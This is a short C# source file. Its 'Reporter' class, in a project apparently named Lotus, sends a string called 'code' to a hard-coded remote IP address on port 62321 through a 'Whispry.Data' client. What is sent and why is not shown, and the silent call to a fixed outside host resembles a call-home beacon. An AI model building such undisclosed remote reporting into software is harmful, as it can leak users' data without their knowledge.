using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Whispry.Data;

namespace Lotus.Classes
{
    static class Reporter //reporting port : 62321
    {
        public static void Report(string code)
        {
            WhispryData data = new WhispryData("193.106.196.207", 62321);   
            data.SendMessage(code);
        }
    }
}
